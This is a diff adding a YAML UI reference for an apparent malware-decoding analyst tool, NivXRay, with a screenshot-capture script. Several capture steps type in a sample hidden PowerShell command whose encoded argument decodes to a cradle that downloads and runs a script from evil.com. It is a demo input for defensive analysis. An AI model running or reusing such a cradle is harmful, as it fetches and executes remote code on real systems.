@@ -1,0 +1,97 @@
+id: ui_reference
+title: NivXRay UI Reference · Every Panel · Every Tab
+purpose: The visual encyclopedia — every button, tab and panel in the Analyst Workspace with a labelled screenshot, what it does, when to use it, and what to look for. Bookmark this page.
+steps:
+  - title: Empty Workspace — the landing state
+    action: Open the WORKSPACE tab. Nothing is decoded yet.
+    expected: You should see the left operations sidebar (97 encoders/decoders), the INPUT card in the centre, and the OUTPUT card on the right. The status line reads 0 chars · 0 bytes.
+  - title: Input panel — where you paste
+    action: Paste the raw suspicious command into the large INPUT textarea. Accepts plain text, hex, base64, URL-encoded — anything.
+    expected: Character count updates live. NivXRay's magic detector runs asynchronously and hints at the likely encoding (e.g., "looks like Base64").
+  - title: Action bar — the four buttons
+    action: Four buttons above the input drive every analysis. From left to right — `NIVXRAY DECODE` (default one-click), `AUTO INVESTIGATE` (full SOC pipeline), `MAGIC DECODE` (deterministic-only), `CLEAR`.
+    expected: All four are always visible. Advanced options live behind the ⋯ chevron next to CLEAR.
+  - title: Output panel — the decoded plaintext
+    action: Click NIVXRAY DECODE. Within 1–2 seconds the OUTPUT card populates with the plaintext.
+    expected: The output supports Copy · Hex · Base64 · Diff views. IOCs, URLs and MITRE ATT&CK IDs are highlighted inline.
+  - title: Decoding Chain — the stages that fired
+    action: Below OUTPUT is the CHAIN card. It shows every decoder stage in order (Base64 → UTF-16LE → …).
+    expected: Each stage row shows the operation name, a mini before/after preview, and a click-through to open that stage in the Recipe editor.
+  - title: GRAPH tab — the Attack Graph
+    action: Click GRAPH in the Threat Analysis panel (top-right). This is a Cytoscape-rendered graph of the entire investigation.
+    expected: Nodes are colour-coded (input · decoded stage · IOC · verdict). Edges are labelled by the decoder that transformed them.
+  - title: MITRE tab — technique mapping
+    action: Click MITRE. Every TTP that the decoded payload maps to is listed with its full name, tactic and confidence.
+    expected: Techniques cluster by tactic (Execution / Command-and-Control / Defense Evasion). Click a chip to filter the GRAPH tab.
+  - title: LOLBAS tab — living-off-the-land binaries
+    action: Click LOLBAS. Any powershell, certutil, mshta, bitsadmin, msbuild, regsvr32, etc. found in the decoded output is listed.
+    expected: Each entry shows the binary, the intent (Download · Execute · Persistence), and a link to the LOLBAS.io reference page.
+  - title: RULES tab — Sigma / YARA hits
+    action: Click RULES. Both community and custom rules that matched are shown here.
+    expected: Rule name, severity, confidence and the exact substring that triggered the hit.
+  - title: IOCS tab — extracted indicators
+    action: Click IOCS. Every URL, IP, domain, hash, mutex or email address found in the decoded output.
+    expected: Click the 🛈 next to any IOC to fetch VT / OTX / AbuseIPDB verdicts inline.
+  - title: TI-HITS tab — threat-intel matches
+    action: Click TI-HITS. Any IOC that already matches a known-bad indicator in your enrichment cache is surfaced first.
+    expected: Includes the source (VT · OTX · AbuseIPDB · custom), confidence and first-seen date.
+  - title: OSINT tab — related open-source signals
+    action: Click OSINT. Non-IOC context — Twitter mentions, GitHub PoCs, MITRE technique write-ups, CTI reports.
+    expected: Each entry has source, date, and one-line summary. Great for hunting related campaigns.
+  - title: AI tab — LLM tiebreaker rationale
+    action: Click AI. When the deterministic engine wasn't sure, the LLM was asked why one candidate should win.
+    expected: Shows the model (Claude Sonnet 4.5), its per-candidate score, and the natural-language justification.
+  - title: FLOW tab — sequential timeline
+    action: Click FLOW. A linear "what happened when" timeline of every stage — decode, enrich, verdict.
+    expected: Great for handing off an investigation — one glance = the full analyst story.
+  - title: CHAIN tab — machine-readable chain
+    action: Click CHAIN. The same chain as in the OUTPUT panel but with per-stage confidence, entropy delta and reasoning.
+    expected: Copy-friendly JSON view for pasting into a ticket or notebook.
+related_features: [candidate_explorer, threat_intel_enrichment, investigation_timeline, auto_investigate, base64_decode]
+
+capture:
+  login: true
+  steps:
+    # 1. Empty workspace
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      delay_ms: 900
+      full_page: false
+    # 2. Input filled (paste)
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      delay_ms: 1200
+      full_page: false
+    # 3. Post-decode full page (Output + Chain visible)
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-nivxray-decode"]'
+      delay_ms: 3500
+      post_click_ms: 4000
+      full_page: true
+    # 4. GRAPH tab (auto-investigate first, then click tab)
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 5000
+      post_click_ms: 5000
+      full_page: true
+    # 5-14. Each of the 10 Threat Analysis tabs (needs the auto-investigate to have populated first)
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 7000
+      post_click_ms: 5000
+      full_page: true
